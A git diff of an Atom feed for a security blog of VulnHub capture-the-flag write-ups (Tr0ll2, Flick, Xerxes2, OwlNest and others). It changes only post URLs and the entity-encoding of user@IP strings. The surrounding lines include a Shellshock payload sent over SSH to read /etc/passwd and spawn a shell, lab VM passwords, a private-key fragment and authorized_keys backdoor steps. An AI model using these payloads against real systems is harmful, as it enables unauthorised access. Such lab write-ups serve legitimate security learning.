@@ -4,7 +4,7 @@
   <title><![CDATA[FourFourFourFour]]></title>
   <link href="http://recrudesce.github.io/atom.xml" rel="self"/>
   <link href="http://recrudesce.github.io/"/>
-  <updated>2015-01-02T00:32:47+00:00</updated>
+  <updated>2015-01-02T00:36:25+00:00</updated>
   <id>http://recrudesce.github.io/</id>
   <author>
     <name><![CDATA[recrudesce]]></name>
@@ -15,9 +15,9 @@
   
   <entry>
     <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
+    <link href="http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
     <updated>2014-12-19T13:50:49+00:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
+    <id>http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
     <content type="html"><![CDATA[<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>
 
 <p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>
@@ -660,9 +660,9 @@
   
   <entry>
     <title type="html"><![CDATA[Knock Knock... Who's There ?]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/10/26/knock-knock-whos-there/"/>
+    <link href="http://recrudesce.github.io/2014/10/26/knock-knock-whos-there/"/>
     <updated>2014-10-26T18:42:03+00:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/10/26/knock-knock-whos-there</id>
+    <id>http://recrudesce.github.io/2014/10/26/knock-knock-whos-there</id>
     <content type="html"><![CDATA[<p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>
 
 <!-- more -->
@@ -892,8 +892,8 @@ root@pwk:~#
 <p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x6a;&#x61;&#115;&#x6f;&#110;&#x40;&#49;&#55;&#50;&#x2e;&#49;&#x36;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#x39;">&#x6a;&#x61;&#x73;&#x6f;&#110;&#64;&#49;&#x37;&#50;&#46;&#x31;&#54;&#x2e;&#53;&#x36;&#46;&#49;&#51;&#57;</a>
-<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#97;&#x73;&#x6f;&#x6e;&#64;&#x31;&#55;&#x32;&#x2e;&#49;&#54;&#46;&#53;&#54;&#46;&#x31;&#51;&#57;">&#106;&#97;&#x73;&#111;&#x6e;&#64;&#x31;&#x37;&#x32;&#46;&#49;&#54;&#x2e;&#53;&#54;&#46;&#x31;&#51;&#x39;</a>&rsquo;s password: jB9jP2knf
+root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x61;&#115;&#x6f;&#110;&#64;&#49;&#x37;&#x32;&#46;&#49;&#54;&#46;&#53;&#54;&#46;&#x31;&#x33;&#x39;">&#x6a;&#97;&#x73;&#111;&#x6e;&#x40;&#49;&#55;&#50;&#x2e;&#x31;&#x36;&#46;&#53;&#x36;&#x2e;&#49;&#x33;&#x39;</a>
+<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#x61;&#115;&#111;&#110;&#x40;&#49;&#x37;&#50;&#x2e;&#x31;&#54;&#x2e;&#x35;&#x36;&#46;&#49;&#x33;&#57;">&#x6a;&#97;&#x73;&#x6f;&#x6e;&#x40;&#x31;&#55;&#x32;&#46;&#x31;&#54;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#57;</a>&rsquo;s password: jB9jP2knf
 Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1401,9 +1401,9 @@ as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM 
   
   <entry>
     <title type="html"><![CDATA[Owl Up In My Grill]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/10/26/owl-up-in-my-grill/"/>
+    <link href="http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill/"/>
     <updated>2014-10-26T17:16:50+00:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/10/26/owl-up-in-my-grill</id>
+    <id>http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill</id>
     <content type="html"><![CDATA[<p>So, while we were all sitting in #vulnhub (on Freenode) waiting for<a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>
 
 <!-- more -->
@@ -1539,7 +1539,7 @@ login        login to shell with specified username and password</p>
 <p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#109;&#x65;&#x40;&#109;&#101;&#46;&#99;&#111;&#x6d;">&#109;&#101;&#64;&#109;&#101;&#46;&#x63;&#x6f;&#x6d;</a>&rdquo;
+root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#101;&#x40;&#x6d;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#109;&#x65;&#64;&#109;&#x65;&#46;&#99;&#111;&#109;</a>&rdquo;
 root@pwk:~# ./owlbin
 Content-type: text/plain</p>
 
@@ -1588,7 +1588,7 @@ uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(d
 <p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-$ ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x72;&#109;&#112;&#x40;&#x31;&#x37;&#x32;&#x2e;&#49;&#x36;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#x31;">&#114;&#109;&#112;&#64;&#x31;&#x37;&#50;&#46;&#x31;&#54;&#x2e;&#53;&#x36;&#x2e;&#x31;&#x33;&#x31;</a>
+$ ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#109;&#x70;&#64;&#49;&#x37;&#x32;&#46;&#49;&#54;&#x2e;&#x35;&#x36;&#46;&#49;&#51;&#x31;">&#114;&#109;&#112;&#64;&#49;&#x37;&#50;&#46;&#x31;&#54;&#x2e;&#x35;&#x36;&#x2e;&#x31;&#x33;&#x31;</a>
 The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
 RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1816,9 +1816,9 @@ True story is that i was looking for some ASCII art to place in the puzzles and 
   
   <entry>
     <title type="html"><![CDATA[Please do not feed the trolls.]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls/"/>
+    <link href="http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls/"/>
     <updated>2014-10-26T14:36:45+00:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls</id>
+    <id>http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls</id>
     <content type="html"><![CDATA[<p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>
 
 <p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>
@@ -2029,7 +2029,7 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 <p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x6e;&#111;&#x6f;&#98;&#64;&#49;&#55;&#x32;&#x2e;&#49;&#54;&#46;&#53;&#54;&#46;&#x31;&#51;&#56;">&#x6e;&#111;&#x6f;&#x62;&#x40;&#x31;&#x37;&#50;&#46;&#49;&#54;&#x2e;&#53;&#x36;&#x2e;&#49;&#51;&#x38;</a>
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#110;&#x6f;&#x6f;&#98;&#x40;&#x31;&#55;&#x32;&#46;&#x31;&#54;&#x2e;&#53;&#x36;&#46;&#49;&#51;&#56;">&#x6e;&#111;&#x6f;&#98;&#64;&#x31;&#x37;&#50;&#46;&#x31;&#54;&#46;&#53;&#x36;&#x2e;&#x31;&#x33;&#56;</a>
 TRY HARDER LOL!
 Connection to 172.16.56.138 closed.
 root@pwk:~#
@@ -2038,7 +2038,7 @@ root@pwk:~#
 <p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#110;&#x6f;&#111;&#x62;&#64;&#49;&#x37;&#50;&#x2e;&#49;&#x36;&#46;&#x35;&#54;&#46;&#x31;&#51;&#x38;">&#110;&#111;&#111;&#98;&#64;&#49;&#55;&#50;&#46;&#x31;&#54;&#x2e;&#x35;&#54;&#x2e;&#x31;&#51;&#x38;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6e;&#x6f;&#x6f;&#98;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#x36;&#46;&#53;&#x36;&#46;&#x31;&#51;&#56;">&#110;&#x6f;&#111;&#x62;&#64;&#49;&#55;&#50;&#46;&#49;&#54;&#46;&#x35;&#x36;&#x2e;&#49;&#x33;&#x38;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -2071,7 +2071,7 @@ root@pwk:~#
 <p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#110;&#x6f;&#x6f;&#x62;&#x40;&#x31;&#x37;&#x32;&#x2e;&#x31;&#x36;&#x2e;&#x35;&#x36;&#46;&#x31;&#x33;&#x38;">&#110;&#111;&#111;&#98;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#54;&#46;&#x35;&#54;&#x2e;&#49;&#x33;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#110;&#x6f;&#111;&#x62;&#x40;&#x31;&#x37;&#50;&#x2e;&#x31;&#x36;&#x2e;&#x35;&#x36;&#46;&#x31;&#x33;&#56;">&#110;&#x6f;&#111;&#x62;&#64;&#x31;&#x37;&#x32;&#x2e;&#x31;&#54;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
 id
 uid=1002(noob) gid=1002(noob) groups=1002(noob)
 [/plain]</p>
@@ -2304,9 +2304,9 @@ You win this time young Jedi&hellip;</p>
   
   <entry>
     <title type="html"><![CDATA[How Many Hackers Does It Take To Change A Lightbulb ?]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
+    <link href="http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/"/>
     <updated>2014-08-13T01:00:28+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
+    <id>http://recrudesce.github.io/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb</id>
     <content type="html"><![CDATA[<p>Whilst in the middle of cracking <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2</a>, <a href="https://twitter.com/leonjza">leonjza</a> decided to release <a href="http://vulnhub.com/entry/flick-1,99/">Flick</a> - a CTF that is sure to tax minds.  Naturally I decided to make myself feel like an unskilled loser, and downloaded it. Here&rsquo;s the story of how I rooted Flick first.</p>
 
 <blockquote>root@flick:~# id
@@ -2370,7 +2370,7 @@ OK: wut ?</p>
 <p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x62;&#x6c;&#x61;&#x68;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#46;&#49;&#x30;&#54;">&#98;&#x6c;&#97;&#x68;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#49;&#x30;&#54;</a></p>
+root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#98;&#x6c;&#x61;&#104;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#48;&#x2e;&#49;&#x30;&#54;">&#x62;&#108;&#x61;&#x68;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#48;&#x2e;&#x31;&#x30;&#54;</a></p>
 
 <p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
 \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
@@ -2479,7 +2479,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x62;&#x6c;&#97;&#x68;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#46;&#49;&#48;&#x36;">&#x62;&#108;&#97;&#x68;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x30;&#x2e;&#x31;&#48;&#54;</a>&rsquo;s password: [/plain]</p>
+<p><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#98;&#x6c;&#x61;&#x68;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#48;&#x2e;&#49;&#48;&#x36;">&#x62;&#x6c;&#97;&#104;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x30;&#46;&#x31;&#48;&#54;</a>&rsquo;s password: [/plain]</p>
 
 <p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>
 
@@ -2856,7 +2856,7 @@ sqlite>
 <p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x72;&#x6f;&#98;&#x69;&#x6e;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#46;&#x31;&#x30;&#54;">&#x72;&#111;&#x62;&#x69;&#110;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#48;&#x2e;&#49;&#48;&#x36;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6f;&#x62;&#x69;&#110;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x30;&#46;&#x31;&#48;&#54;">&#114;&#111;&#x62;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x30;&#46;&#49;&#x30;&#x36;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2866,10 +2866,10 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x72;&#111;&#x62;&#x69;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x30;&#46;&#49;&#48;&#x36;">&#114;&#x6f;&#98;&#105;&#x6e;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#x36;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
+<p><a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#114;&#111;&#x62;&#105;&#110;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#x30;&#54;">&#114;&#x6f;&#98;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#x31;&#48;&#54;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
 Permission denied, please try again.
-<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x72;&#x6f;&#x62;&#x69;&#110;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#48;&#x2e;&#49;&#x30;&#x36;">&#114;&#x6f;&#98;&#x69;&#110;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#48;&#x2e;&#49;&#48;&#54;</a>&rsquo;s password: ^C
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x64;&#x65;&#97;&#110;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#48;&#46;&#49;&#x30;&#54;">&#100;&#x65;&#x61;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#48;&#46;&#x31;&#48;&#x36;</a></p>
+<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#x2e;&#x31;&#x30;&#54;">&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#x31;&#x30;&#x36;</a>&rsquo;s password: ^C
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#100;&#x65;&#97;&#x6e;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x30;&#46;&#49;&#48;&#54;">&#x64;&#x65;&#x61;&#x6e;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#48;&#54;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2879,7 +2879,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#100;&#101;&#x61;&#110;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#48;&#46;&#x31;&#48;&#x36;">&#100;&#101;&#97;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#x36;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+<p><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#100;&#x65;&#97;&#110;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#48;&#46;&#x31;&#48;&#54;">&#x64;&#x65;&#x61;&#110;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#48;&#46;&#49;&#x30;&#54;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
 Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>
 
 <ul>
@@ -3022,7 +3022,7 @@ dean@flick:~$ [/plain]</p>
 <p>[plain gutter=&ldquo;false&rdquo;]
 dean@flick:~$ ./read_docker ./ > robin.priv
 dean@flick:~$ chmod 600 ./robin.priv
-dean@flick:~$ ssh -i robin.priv <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x62;&#105;&#110;&#64;&#x31;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;">&#x72;&#x6f;&#98;&#105;&#110;&#64;&#x31;&#50;&#x37;&#46;&#48;&#46;&#x30;&#46;&#x31;</a></p>
+dean@flick:~$ ssh -i robin.priv <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;">&#114;&#111;&#x62;&#105;&#x6e;&#x40;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -3787,7 +3787,7 @@ robin@flick:~$ /tmp/rootshell</p>
 <p>And for completeness, an SSH session as root.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#x36;">&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#48;&#46;&#x31;&#48;&#x36;</a></p>
+root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#111;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#x30;&#54;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#48;&#46;&#49;&#48;&#x36;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -3832,9 +3832,9 @@ root@flick:~#
   
   <entry>
     <title type="html"><![CDATA[The Glory of The Many Demands your Capture or Destruction.]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction/"/>
+    <link href="http://recrudesce.github.io/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction/"/>
     <updated>2014-08-08T13:16:46+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction</id>
+    <id>http://recrudesce.github.io/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction</id>
     <content type="html"><![CDATA[<p>It&rsquo;s been a long wait, but <a href="http://twitter.com/barrebas">barrebas</a> released <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2 on Vulnhub</a>. I&rsquo;ve not broken into Xerxes1, so I figured what the hell, lets give this a go. It might take me ages, but it&rsquo;s all a learning curve, right ?  Here&rsquo;s how I became the first person to get root</p>
 
 <blockquote>root@xerxes2:~# id
@@ -4025,7 +4025,7 @@ $
 <p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#100;&#x65;&#108;&#x61;&#x63;&#114;&#111;&#x69;&#120;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#48;&#x2e;&#x31;&#48;&#50;">&#x64;&#101;&#108;&#x61;&#x63;&#x72;&#x6f;&#x69;&#120;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x30;&#46;&#49;&#48;&#x32;</a></p>
+root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#100;&#101;&#x6c;&#x61;&#99;&#114;&#x6f;&#x69;&#120;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#x32;">&#100;&#101;&#108;&#97;&#x63;&#x72;&#x6f;&#x69;&#x78;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x30;&#46;&#49;&#x30;&#50;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -4355,7 +4355,7 @@ $[/plain]</p>
 
 <p>Say hello to <a href="http://shodan.wikia.com/wiki/Janice_Polito">Janice Polito</a>, she&rsquo;s got a smirk on her hasn&rsquo;t she ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x70;&#111;&#108;&#105;&#x74;&#111;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#46;&#x31;&#x30;&#x32;">&#x70;&#111;&#x6c;&#105;&#x74;&#x6f;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x30;&#46;&#49;&#x30;&#x32;</a></p>
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x70;&#x6f;&#x6c;&#105;&#x74;&#111;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#48;&#x2e;&#49;&#x30;&#50;">&#x70;&#x6f;&#108;&#x69;&#116;&#x6f;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#x2e;&#49;&#x30;&#50;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -4903,7 +4903,7 @@ korenchkin@xerxes2:~$ .32.1
 ]0;korenchkin@xerxes2: ~
 korenchkin@xerxes2:~$
 ts/0korenchkin
-2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#114;&#x6f;&#111;&#x74;&#64;&#120;&#x65;&#114;&#120;&#101;&#115;&#x32;&#x2e;&#116;&#x72;&#105;&#111;&#x70;&#116;&#x69;&#x6d;&#117;&#109;">&#114;&#111;&#x6f;&#x74;&#64;&#120;&#x65;&#x72;&#120;&#101;&#115;&#50;&#46;&#116;&#x72;&#x69;&#111;&#x70;&#x74;&#105;&#x6d;&#x75;&#x6d;</a> R=local_user T=mail_spool
